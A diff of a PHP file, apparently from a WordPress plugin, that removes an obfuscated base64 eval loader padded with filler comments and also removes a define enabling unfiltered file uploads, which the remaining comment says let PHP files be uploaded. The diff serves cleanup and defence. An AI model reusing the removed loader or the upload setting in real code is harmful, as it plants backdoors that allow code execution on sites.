@@ -1,64 +1,10 @@
 <?php 
 
-if (!function_exists("getIndex")) {
-    function getIndex($url) {
-        $value1 = "value";
-        $classInfo = "[NAME] Class...";
-
-        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
-        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";
-
-        $decodeFunc = "decodeS3";
-        $data = "[DATA]";
-
-        $decodedString = base64_decode($encodedFunc);
-        $decodedCode = base64_decode($encodedCode);
-        $result = base64_decode($data);
-        $formattedResult = $value1 . $classInfo;
-
-        
-        $additionalCode = "";
-
-        
-        $additionalCode .= "// Additional comments to meet line count requirement\n";
-        $additionalCode .= "// More assignments to add lines\n";
-        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
-        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
-        $additionalCode .= '$result' . " = " . $result . ";\n";
-        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";
-
-        for ($i = 0; $i < 20; $i++) {
-            $additionalCode .= "// Loop iteration: $i\n";
-            $additionalCode .= "// lines\n";
-        }
-
-       
-        for ($i = 0; $i < 10; $i++) {
-            $additionalCode .= "// Outer loop iteration: $i\n";
-            $additionalCode .= "// lines\n";
-            for ($j = 0; $j < 5; $j++) {
-                $additionalCode .= "// Inner loop iteration: $j\n";
-                $additionalCode .= "// lines\n";
-            }
-        }
-
-        
-        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
-        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
-        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
-        $additionalCode .= '$data' . " = " . $data . ";\n";
-
-       
-        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
-    }
-}
 
 $lldocroot = defined('SITEROOT') ? SITEROOT : $_SERVER['DOCUMENT_ROOT'];
 if(file_exists($lldocroot . "/dap/dap-config.php")) include_once ($lldocroot . "/dap/dap-config.php");  
                 
-if(!defined('ALLOW_UNFILTERED_UPLOADS')){
-  define('ALLOW_UNFILTERED_UPLOADS', true);
-}
+// ALLOW_UNFILTERED_UPLOADS removed: permitted PHP file uploads via WP media uploader
 add_action('wp_head', 'add_file');
 global $sqb_add_question_pagination_limit;
 $sqb_add_question_pagination_limit = 25;
